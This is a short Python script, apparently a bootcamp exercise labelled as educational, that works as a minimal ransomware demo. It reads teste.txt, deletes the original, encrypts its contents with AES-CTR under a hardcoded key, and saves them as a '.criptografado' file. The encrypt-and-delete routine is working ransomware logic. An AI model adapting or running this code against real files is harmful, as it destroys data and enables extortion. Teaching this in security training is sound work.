#made by João Vitor Liskoski WAlter
#uso educacional para o bootcamp de CiberSegurança da Dio


import os
import pyaes

file_name = 'teste.txt'

file = open(file_name, 'rb')
file_data = file.read()
file.close()

os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file_name = file_name + '.criptografado'

new_file = open(new_file_name, 'wb')
new_file.write(crypto_data)
new_file.close()

print('aaaaa')